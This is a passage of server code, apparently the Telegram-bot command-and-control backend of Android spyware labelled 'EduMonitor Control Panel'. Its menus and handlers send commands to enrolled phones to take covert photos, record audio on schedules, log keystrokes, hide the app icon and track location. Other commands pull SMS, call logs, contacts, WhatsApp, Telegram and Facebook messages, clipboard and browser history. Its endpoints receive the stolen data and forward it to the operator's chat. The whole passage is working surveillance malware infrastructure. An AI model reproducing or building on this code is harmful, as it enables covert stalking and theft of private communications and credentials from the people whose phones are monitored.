            message += `• Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n`;
            if (device.phoneNumber !== 'Not available') {
                message += `• Phone: ${device.phoneNumber}\n`;
            }
            message += `\n`;
        });
        
        await answerCallbackQuery(callbackId);
        await sendTelegramMessage(chatId, message);
        
    } else if (data.startsWith('select_device:')) {
        const selectedDeviceId = data.split(':')[1];
        const device = devices.get(selectedDeviceId);
        
        if (device) {
            userDeviceSelection.set(chatId, selectedDeviceId);
            
            await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
            
            const keyboard = getMainMenuKeyboard(chatId);
            await editMessageKeyboard(chatId, messageId, keyboard);
            
            await sendTelegramMessage(chatId, 
                `✅ *Now controlling:*\n` +
                `• Device: ${device.deviceInfo?.model || 'Unknown'}\n` +
                `• ID: ${selectedDeviceId.substring(0, 8)}...\n` +
                `• Last seen: ${new Date(device.lastSeen).toLocaleString()}\n\n` +
                `All commands will now be sent to this device.`);
        }
        
    } else if (data === 'menu_camera') {
        const keyboard = [
            [
                { text: '📸 Take Photo', callback_data: 'cmd:photo' },
                { text: '🔄 Switch Camera', callback_data: 'cmd:camera_switch' }
            ],
            [
                { text: '👤 Front Camera', callback_data: 'cmd:camera_front' },
                { text: '👥 Back Camera', callback_data: 'cmd:camera_back' }
            ],
            [
                { text: '✅ Start Monitoring', callback_data: 'cmd:camera_on' },
                { text: '❌ Stop Monitoring', callback_data: 'cmd:camera_off' }
            ],
            [
                { text: '📊 Camera Status', callback_data: 'cmd:camera_status' },
                { text: '◀️ Back', callback_data: 'help_main' }
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_device_info') {
        const keyboard = [
            [
                createInlineButton('🌐 Network Info', 'cmd:network'),
                createInlineButton('📱 Apps List', 'cmd:apps')
            ],
            [
                createInlineButton('📱 Device Info', 'cmd:info'),
                createInlineButton('🔋 Battery', 'cmd:battery')
            ],
            [
                createInlineButton('💾 Storage', 'cmd:storage'),
                createInlineButton('🕐 Time', 'cmd:time')
            ],
            [
                createInlineButton('📊 Status', 'cmd:status'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_phone_info') {
        const keyboard = [
            [
                createInlineButton('📞 Phone Number', 'cmd:phone_number'),
                createInlineButton('📱 SIM Info', 'cmd:sim_info')
            ],
            [
                createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
                createInlineButton('📞 Call Logs', 'cmd:calllogs')
            ],
            [
                createInlineButton('📍 Location', 'cmd:location'),
                createInlineButton('💬 SMS', 'cmd:sms')
            ],
            [
                createInlineButton('📇 Contacts', 'cmd:contacts'),
                createInlineButton('📅 Calendar', 'cmd:calendar')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_tracking') {
        const keyboard = [
            [
                createInlineButton('📍 Location', 'cmd:location'),
                createInlineButton('⌨️ Keystrokes', 'cmd:keystrokes')
            ],
            [
                createInlineButton('🔔 Notifications', 'cmd:notifications'),
                createInlineButton('📱 App Opens', 'cmd:app_opens')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_screenshot') {
        const keyboard = [
            [
                createInlineButton('📸 Take Now', 'cmd:screenshot'),
                createInlineButton('⚙️ Settings', 'cmd:screenshot_settings')
            ],
            [
                createInlineButton('▶️ Start Service', 'cmd:start_screenshot'),
                createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot')
            ],
            [
                createInlineButton('📸 Screenshot Logs', 'cmd:screenshots'),
                createInlineButton('📏 Size Status', 'cmd:size_status')
            ],
            [
                createInlineButton('➕ Add Target', 'cmd:add_target_example'),
                createInlineButton('📱 Target Apps', 'cmd:target_apps')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_recording') {
        const keyboard = [
            [
                createInlineButton('🎤 Start 60s', 'cmd:record'),
                createInlineButton('⏹️ Stop 60s', 'cmd:stop_recording')
            ],
            [
                createInlineButton('⚙️ Settings', 'cmd:recording_settings'),
                createInlineButton('⏰ Schedule', 'cmd:record_schedule')
            ],
            [
                createInlineButton('✅ Auto ON', 'cmd:record_auto_on'),
                createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')
            ],
            [
                createInlineButton('🔍 Find Media', 'cmd:find_media'),
                createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_social') {
        const keyboard = [
            [
                createInlineButton('💬 WhatsApp', 'cmd:whatsapp'),
                createInlineButton('💬 Telegram', 'cmd:telegram')
            ],
            [
                createInlineButton('💬 Facebook', 'cmd:facebook'),
                createInlineButton('🌐 Browser History', 'cmd:browser_history')
            ],
            [
                createInlineButton('📋 Clipboard', 'cmd:clipboard'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_media') {
        const keyboard = [
            [
                createInlineButton('🔍 Find Media', 'cmd:find_media'),
                createInlineButton('📸 Screenshots', 'cmd:screenshots')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_network') {
        const keyboard = [
            [
                createInlineButton('🌐 IP Info', 'cmd:ip_info'),
                createInlineButton('📶 WiFi Info', 'cmd:wifi_info')
            ],
            [
                createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
                createInlineButton('📡 Network Status', 'cmd:network')
            ],
            [
                createInlineButton('🌍 All Network', 'cmd:all_info'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_realtime') {
        const keyboard = [
            [
                createInlineButton('🔔 Realtime ON', 'cmd:realtime_on'),
                createInlineButton('🔕 Realtime OFF', 'cmd:realtime_off')
            ],
            [
                createInlineButton('📊 Realtime Status', 'cmd:realtime_status'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_services') {
        const keyboard = [
            [
                createInlineButton('👻 Hide Icon', 'cmd:hide_icon'),
                createInlineButton('👁️ Show Icon', 'cmd:show_icon')
            ],
            [
                createInlineButton('🔄 Reboot Services', 'cmd:reboot_app'),
                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')
            ],
            [
                createInlineButton('📊 Service Status', 'cmd:status'),
                createInlineButton('📝 Logs Count', 'cmd:logs_count')
            ],
            [
                createInlineButton('📈 Stats', 'cmd:stats'),
                createInlineButton('🔄 Refresh', 'cmd:refresh_data')
            ],
            [
                createInlineButton('⚡ Force Harvest', 'cmd:force_harvest'),
                createInlineButton('🔄 Sync All', 'cmd:sync_all')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'close_menu') {
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
        
    } else if (data === 'start_custom_schedule_interactive') {
        userStates.set(chatId, {
            state: SCHEDULE_STATES.AWAITING_START_TIME,
            data: {}
        });
        
        const keyboard = [[createInlineButton('❌ Cancel', 'cancel_setup')]];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
        await sendTelegramMessage(chatId, 
            "⚙️ *Custom Schedule Setup*\n\n" +
            "Please enter the START time in 24-hour format (HH:MM)\n" +
            "Example: `22:00` for 10:00 PM");
        
    } else if (data === 'cancel_setup') {
        userStates.delete(chatId);
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "❌ Schedule setup cancelled.");
        
    } else if (data === 'cmd:add_target_example') {
        await sendTelegramMessage(chatId, 
            "📱 *Add Target App*\n\n" +
            "Use: `/add_target com.package.name`\n\n" +
            "Examples:\n" +
            "• `/add_target com.instagram.android`\n" +
            "• `/add_target com.whatsapp`\n" +
            "• `/add_target com.facebook.katana`");
        
    } else if (data.startsWith('recurring:')) {
        const recurring = data.split(':')[1];
        const userState = userStates.get(chatId);
        
        if (userState && userState.state === SCHEDULE_STATES.AWAITING_RECURRING) {
            userState.data.recurring = recurring === 'daily';
            userState.state = SCHEDULE_STATES.AWAITING_INTERVAL;
            
            await editMessageKeyboard(chatId, messageId, []);
            await sendTelegramMessage(chatId, 
                "✅ Schedule type recorded.\n\n" +
                "Finally, enter the recording interval in minutes (e.g., 15, 30, 60):");
        }
        
    } else if (data.startsWith('cmd:')) {
        const command = data.substring(4);
        console.log(`🎯 Executing command from button: ${command}`);
        
        await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
        
        await handleCommand(chatId, `/${command}`, messageId);
        
        const keyboard = [
            [
                createInlineButton('✅ Command Sent', 'noop'),
                createInlineButton('◀️ Back to Menu', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    }
}

// ============= CONVERSATION HANDLER =============

async function handleConversationMessage(chatId, text, messageId, userState) {
    console.log(`💬 Conversation message: ${text} in state ${userState.state}`);
    
    switch (userState.state) {
        case SCHEDULE_STATES.AWAITING_START_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 22:00)");
                return;
            }
            
            userState.data.startTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_END_TIME;
            
            await sendTelegramMessage(chatId, 
                "✅ Start time recorded.\n\n" +
                "Now enter the END time (HH:MM)\n" +
                "Example: `02:00` for 2:00 AM");
            break;
            
        case SCHEDULE_STATES.AWAITING_END_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 02:00)");
                return;
            }
            
            userState.data.endTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_RECURRING;
            
            const keyboard = [
                [
                    createInlineButton('✅ Daily', 'recurring:daily'),
                    createInlineButton('🔄 Once', 'recurring:once')
                ]
            ];
            
            await sendTelegramMessageWithKeyboard(
                chatId,
                "✅ End time recorded.\n\n" +
                "Should this schedule repeat daily or run once?",
                keyboard
            );
            break;
            
        case SCHEDULE_STATES.AWAITING_INTERVAL:
            const interval = parseInt(text);
            if (isNaN(interval) || interval < 5 || interval > 120) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid interval. Please enter a number between 5 and 120.");
                return;
            }
            
            const [startHour, startMin] = userState.data.startTime.split(':').map(Number);
            const [endHour, endMin] = userState.data.endTime.split(':').map(Number);
            const recurring = userState.data.recurring;
            
            const command = `/record_custom ${startHour.toString().padStart(2,'0')}:${startMin.toString().padStart(2,'0')} ${endHour.toString().padStart(2,'0')}:${endMin.toString().padStart(2,'0')} ${recurring ? 'daily' : 'once'} ${interval}`;
            
            userStates.delete(chatId);
            
            await handleCommand(chatId, command, messageId);
            
            await sendTelegramMessage(chatId, 
                "✅ *Custom Schedule Configured*\n\n" +
                `Start: ${userState.data.startTime}\n` +
                `End: ${userState.data.endTime}\n` +
                `Type: ${recurring ? 'Daily' : 'One-time'}\n` +
                `Interval: ${interval} minutes\n\n` +
                `Command sent to device.`);
            break;
    }
}

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);

    // Handle /devices command
    if (command === '/devices') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📱 *Your Devices*\n\n`;
        
        if (userDevices.length === 0) {
            message += "No devices registered yet.";
        } else {
            userDevices.forEach((device, index) => {
                const status = device.isActive ? '✅ ACTIVE' : '○';
                message += `${index + 1}. ${status} ${device.name}\n`;
                message += `   ID: \`${device.id}\`\n`;
                message += `   Last Seen: ${device.lastSeenFormatted}\n`;
                message += `   Status: ${(Date.now() - device.lastSeen) < 300000 ? '🟢 Online' : '⚫ Offline'}\n`;
                if (device.phoneNumber !== 'Not available') {
                    message += `   Phone: ${device.phoneNumber}\n`;
                }
                message += `\n`;
            });
            message += `\nUse /select [device_id] to switch active device.`;
        }
        
        await sendTelegramMessage(chatId, message);
        return;
    }

    // Handle /select command
    if (command.startsWith('/select ')) {
        const deviceId = command.substring(8).trim();
        const device = devices.get(deviceId);
        
        if (device && String(device.chatId) === String(chatId)) {
            userDeviceSelection.set(chatId, deviceId);
            await sendTelegramMessage(chatId, 
                `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}\n` +
                `ID: ${deviceId.substring(0, 8)}...`);
        } else {
            await sendTelegramMessage(chatId, '❌ Device not found or not authorized.');
        }
        return;
    }

    // Handle /find_media command
    if (command === '/find_media' || command === '/scan_media') {
        
        const selectedDeviceId = userDeviceSelection.get(chatId);
        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
        
        if (!device) {
            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
            return;
        }
        
        if (!device.pendingCommands) {
            device.pendingCommands = [];
        }
        
        device.pendingCommands.push({
            command: 'find_media',
            originalCommand: command,
            messageId: messageId,
            timestamp: Date.now()
        });
        
        console.log(`📝 Find Media command queued for device ${selectedDeviceId}`);
        
        await sendTelegramMessage(chatId, 
            `🔍 *Media Scanner*\n\n` +
            `📱 Device: ${device.deviceInfo?.model || 'Unknown'}\n\n` +
            `✅ Scan command sent to device.\n` +
            `The device will search for:\n` +
            `• Images (JPG, PNG, GIF)\n` +
            `• Videos (MP4, 3GP, MKV)\n` +
            `• Audio (MP3, AMR, OPUS)\n` +
            `• WhatsApp/Telegram media\n\n` +
            `⏱️ This may take a moment...`);
        return;
    }

    if (command === '/help' || command === '/start' || command === '/menu') {
        console.log('📋 Showing main menu');
        
        await sendTelegramMessageWithKeyboard(
            chatId,
            "🤖 <b>EduMonitor Control Panel v4.0</b>\n\n" +
            "Select a category to get started:",
            getMainMenuKeyboard(chatId)
        );
        return;
    }

    // Get the currently selected device for this user
    let selectedDeviceId = userDeviceSelection.get(chatId);
    let device = null;
    let deviceInfo = null;
    
    if (selectedDeviceId) {
        device = devices.get(selectedDeviceId);
        if (device) {
            deviceInfo = device.deviceInfo;
        }
    }
    
    // If no device selected or selected device not found, try to find any device
    if (!device) {
        for (const [id, d] of devices.entries()) {
            if (String(d.chatId) === String(chatId)) {
                selectedDeviceId = id;
                device = d;
                deviceInfo = d.deviceInfo;
                userDeviceSelection.set(chatId, selectedDeviceId);
                console.log(`✅ Auto-selected device: ${selectedDeviceId}`);
                break;
            }
        }
    }

    if (!device) {
        console.log(`❌ No device found for chat ${chatId}`);
        const keyboard = [
            [{ text: '🔄 Check Again', callback_data: 'refresh_devices' }],
            [{ text: '◀️ Main Menu', callback_data: 'help_main' }]
        ];
        await sendTelegramMessageWithKeyboard(
            chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running and try refreshing.',
            keyboard
        );
        return;
    }

    device.lastSeen = Date.now();

    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commandObject = {
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    };
    
    device.pendingCommands.push(commandObject);
    console.log(`📝 Command queued for device ${selectedDeviceId}:`, commandObject);

    let ackMessage = `⏳ Processing: ${command}`;
    if (deviceInfo) {
        ackMessage += `\n📱 Device: ${deviceInfo.model || 'Unknown'}`;
    }
    
    await sendTelegramMessage(chatId, ackMessage);
}

// ============= IP INFO ENDPOINT =============
app.post('/api/ipinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const ipData = req.body;
        
        console.log(`🌐 IP Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        ipData.serverIP = getServerIP();
        device.lastIPInfo = ipData;
        
        const formattedMessage = formatIPInfo(ipData);
        
        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n`;
        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ IP Info endpoint error:', error);
        res.status(500).json({ error: 'IP Info processing failed' });
    }
});

// ============= PHONE NUMBER ENDPOINT =============

app.post('/api/phonenumber/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const phoneData = req.body;
        
        console.log(`📞 Phone number received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.phoneNumber = phoneData.phoneNumber;
        device.simInfo = phoneData.simInfo;
        
        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        message += '📞 <b>Phone Information</b>\n\n';
        
        if (phoneData.phoneNumber && phoneData.phoneNumber !== 'Unknown') {
            message += `📱 <b>Phone Number:</b> <code>${phoneData.phoneNumber}</code>\n`;
        } else {
            message += `⚠️ <b>Phone Number:</b> Not available (no SIM or permission required)\n`;
        }
        
        if (phoneData.simInfo) {
            if (Array.isArray(phoneData.simInfo)) {
                message += `\n<b>SIM Information (Multiple SIMs):</b>\n`;
                phoneData.simInfo.forEach((sim, index) => {
                    message += `\n📱 <b>SIM ${index + 1}</b>\n`;
                    message += `• Slot: ${sim.slot || 'Unknown'}\n`;
                    message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
                    message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
                });
            } else {
                message += `\n<b>SIM Information:</b>\n`;
                message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
                message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
                message += `• SIM State: ${phoneData.simInfo.simState || 'Unknown'}\n`;
            }
        }
        
        await sendTelegramMessage(chatId, message);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Phone Number endpoint error:', error);
        res.status(500).json({ error: 'Phone Number processing failed' });
    }
});

// ============= SIM INFO ENDPOINT =============

app.post('/api/siminfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const simData = req.body;
        
        console.log(`📱 SIM Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.simInfo = simData;
        
        const formattedMessage = formatSimInfo(simData);
        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ SIM Info endpoint error:', error);
        res.status(500).json({ error: 'SIM Info processing failed' });
    }
});

// ============= WIFI INFO ENDPOINT =============

app.post('/api/wifiinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const wifiData = req.body;
        
        console.log(`📶 WiFi Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.wifiInfo = wifiData;
        
        const formattedMessage = formatWifiInfo(wifiData);
        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ WiFi Info endpoint error:', error);
        res.status(500).json({ error: 'WiFi Info processing failed' });
    }
});

// ============= MOBILE INFO ENDPOINT =============

app.post('/api/mobileinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const mobileData = req.body;
        
        console.log(`📱 Mobile Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.mobileInfo = mobileData;
        
        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        message += '📱 <b>Mobile Network Information</b>\n\n';
        
        if (mobileData.operator) {
            message += `📶 *Network*\n`;
            message += `• Operator: ${mobileData.operator}\n`;
            message += `• Country: ${mobileData.country}\n`;
            message += `• Type: ${mobileData.networkType}\n`;
            message += `• Roaming: ${mobileData.roaming ? 'Yes' : 'No'}\n`;
        }
        
        if (mobileData.ip) {
            message += `\n🌐 *Mobile IP*\n`;
            message += `• ${mobileData.ip}\n`;
        }
        
        if (mobileData.dataEnabled !== undefined) {
            message += `\n🔌 *Connection Status*\n`;
            message += `• Mobile Data: ${mobileData.dataEnabled ? '✅ ON' : '❌ OFF'}\n`;
        }
        
        await sendTelegramMessage(chatId, message);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Mobile Info endpoint error:', error);
        res.status(500).json({ error: 'Mobile Info processing failed' });
    }
});

// ============= FILE UPLOAD ENDPOINT =============

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !command || !filename || !req.file) {
            console.error('❌ Missing fields in upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        let caption = `📱 *${deviceName}*\n\n`;
        
        switch (command) {
            case 'contacts':
                caption += `📇 Contacts Export (${itemCount} contacts)`;
                break;
            case 'sms':
                caption += `💬 SMS Messages Export (${itemCount} messages)`;
                break;
            case 'calllogs':
                caption += `📞 Call Logs Export (${itemCount} calls)`;
                break;
            case 'apps':
                caption += `📱 Installed Apps Export (${itemCount} apps)`;
                break;
            case 'keystrokes':
                caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                break;
            case 'notifications':
                caption += `🔔 Notifications Export (${itemCount} notifications)`;
                break;
            case 'app_opens':
                caption += `📱 App Opens Export (${itemCount} entries)`;
                break;
            case 'whatsapp':
                caption += `💬 WhatsApp Messages Export (${itemCount} messages)`;
                break;
            case 'telegram':
                caption += `💬 Telegram Messages Export (${itemCount} messages)`;
                break;
            case 'facebook':
                caption += `💬 Facebook Messages Export (${itemCount} messages)`;
                break;
            case 'browser_history':
                caption += `🌐 Browser History Export (${itemCount} entries)`;
                break;
            case 'clipboard':
                caption += `📋 Clipboard History Export (${itemCount} entries)`;
                break;
            case 'calendar':
                caption += `📅 Calendar Events Export (${itemCount} events)`;
                break;
            case 'screenshots':
                caption += `📸 Screenshot Metadata Export (${itemCount} entries)`;
                break;
            default:
                caption += `📎 Data Export`;
        }
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted temporary file: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting file:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ File upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= LOG INGESTION ENDPOINTS =============

app.post('/api/logs', async (req, res) => {
    try {
        const logData = req.body;
        
        console.log(`📝 Log received:`, {
            type: logData.type,
            deviceId: logData.deviceId,
            timestamp: new Date(logData.timestamp).toISOString(),
            package: logData.package
        });

        if (!logData.deviceId) {
            console.error('❌ Missing deviceId in log');
            return res.status(400).json({ error: 'Missing deviceId' });
        }

        const device = devices.get(logData.deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${logData.deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }

        const chatId = device.chatId;
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n`;

        let message = '';
        
        switch (logData.type) {
            case 'keystroke':
                message = devicePrefix + `⌨️ <b>Keystroke</b>\n` +
                         `App: <code>${logData.package || 'unknown'}</code>\n` +
                         `Text: <code>${logData.data?.substring(0, 100)}</code>`;
                break;
                
            case 'notification':
                message = devicePrefix + `🔔 <b>Notification</b>\n` +
                         `App: <code>${logData.package || 'unknown'}</code>\n` +
                         `Title: <b>${logData.title || ''}</b>\n` +
                         `Content: <code>${logData.data?.substring(0, 100)}</code>`;
                break;
                
            case 'location':
                return res.json({ success: true, handled: 'location_endpoint' });
                
            case 'ip_info':
                return res.json({ success: true, handled: 'ipinfo_endpoint' });
                
            case 'phone_number':
                return res.json({ success: true, handled: 'phonenumber_endpoint' });
                
            case 'sim_info':
                return res.json({ success: true, handled: 'siminfo_endpoint' });
                
            case 'wifi_info':
                return res.json({ success: true, handled: 'wifiinfo_endpoint' });
                
            case 'mobile_info':
                return res.json({ success: true, handled: 'mobileinfo_endpoint' });
                
            case 'app_open':
                return res.json({ success: true, handled: 'app_open_batch' });
                
            case 'contacts':
            case 'sms':
            case 'calllogs':
            case 'apps':
            case 'keystrokes':
            case 'notifications':
            case 'whatsapp':
            case 'telegram':
            case 'facebook':
            case 'browser_history':
            case 'clipboard':
            case 'calendar':
            case 'screenshots':
                return res.json({ success: true, handled: 'file_upload_endpoint' });
                
            case 'device_info':
                try {
                    const info = JSON.parse(logData.data || '{}');
                    message = devicePrefix + `📱 <b>Device Info Update</b>\n` +
                             `Model: ${info.model || 'unknown'}\n` +
                             `Android: ${info.androidVersion || 'unknown'}\n` +
                             `Manufacturer: ${info.manufacturer || 'unknown'}`;
                } catch (e) {
                    message = devicePrefix + `📱 <b>Device Info Update</b>\n` +
                             `Data: ${logData.data?.substring(0, 100)}`;
                }
                break;
                
            default:
                message = devicePrefix + `📝 <b>Log: ${logData.type}</b>\n` +
                         `Data: ${logData.data?.substring(0, 200)}`;
        }

        if (message) {
            sendTelegramMessage(chatId, message).catch(e => 
                console.error('Failed to send log to Telegram:', e)
            );
        }

        console.log(`✅ Log processed for device ${logData.deviceId}`);

        res.json({ 
            success: true, 
            timestamp: Date.now(),
            message: 'Log received'
        });

    } catch (error) {
        console.error('❌ Error processing log:', error);
        res.status(500).json({ 
            error: 'Failed to process log',
            message: error.message 
        });
    }
});

app.post('/api/log', (req, res) => {
    console.log('📝 Redirecting /api/log to /api/logs');
    req.url = '/api/logs';
    app._router.handle(req, res);
});

app.post('/api/logs/batch', async (req, res) => {
    try {
        const logs = req.body;
        
        if (!Array.isArray(logs)) {
            return res.status(400).json({ error: 'Expected array of logs' });
        }

        console.log(`📦 Received batch of ${logs.length} logs`);

        const deviceLogs = new Map();
        
        for (const log of logs) {
            if (log.deviceId) {
                if (!deviceLogs.has(log.deviceId)) {
                    deviceLogs.set(log.deviceId, []);
                }
                deviceLogs.get(log.deviceId).push(log);
            }
        }

        for (const [deviceId, deviceLogsList] of deviceLogs.entries()) {
            const device = devices.get(deviceId);
            if (device) {
                const nonAppOpenLogs = deviceLogsList.filter(log => log.type !== 'app_open');
                
                if (nonAppOpenLogs.length > 0) {
                    const typeCounts = {};
                    nonAppOpenLogs.forEach(log => {
                        typeCounts[log.type] = (typeCounts[log.type] || 0) + 1;
                    });
                    
                    const typeSummary = Object.entries(typeCounts)
                        .map(([type, count]) => `• ${type}: ${count}`)
                        .join('\n');
                    
                    const summary = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n` +
                        `📊 <b>Log Batch Summary</b>\n` +
                        `Received ${nonAppOpenLogs.length} logs:\n` +
                        `${typeSummary}\n\n` +
                        `First log: ${new Date(nonAppOpenLogs[0].timestamp).toLocaleString()}\n` +
                        `Last log: ${new Date(nonAppOpenLogs[nonAppOpenLogs.length-1].timestamp).toLocaleString()}`;
                    
                    sendTelegramMessage(device.chatId, summary).catch(console.error);
                }
            }
        }

        res.json({ 
            success: true, 
            processed: logs.length,
            devices: deviceLogs.size
        });

    } catch (error) {
        console.error('❌ Error processing batch logs:', error);
        res.status(500).json({ 
            error: 'Failed to process batch logs',
            message: error.message 
        });
    }
});

// ============= LOCATION ENDPOINT =============

app.post('/api/location/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const locationData = req.body;
        
        console.log(`📍 Location data from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.lastLocation = locationData;
        
        const formatted = formatLocationMessage(locationData);
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (formatted.lat && formatted.lon) {
            try {
                await axios.post(`${TELEGRAM_API}/sendLocation`, {
                    chat_id: chatId,
                    latitude: formatted.lat,
                    longitude: formatted.lon,
                    live_period: 60
                });
                console.log('✅ Location pin sent');
            } catch (e) {
                console.error('Failed to send location pin:', e.message);
            }
        }
        
        await sendTelegramMessage(chatId, devicePrefix + formatted.text);
        
        res.json({ success: true });
        
    } catch (error) {
